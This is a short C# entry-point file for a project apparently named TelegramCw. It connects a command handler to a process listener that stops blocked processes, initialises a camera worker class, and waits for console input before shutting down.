using System;
using System.Threading.Tasks;

namespace TelegramCw
{
    class Program
    {
        static async Task Main()
        {
            
            var commandHandler = new CommandHandler();
            var processListener = new ProcessListener(commandHandler.BlockedProcesses);

            commandHandler.OnProcessAdded += (sender, name) =>
            {
                processListener.StopProcess(name);
            };
            CamWorker.Init();

            Console.ReadLine();
            commandHandler.StopReceiving();
            processListener.StopListen();
        }
    }
}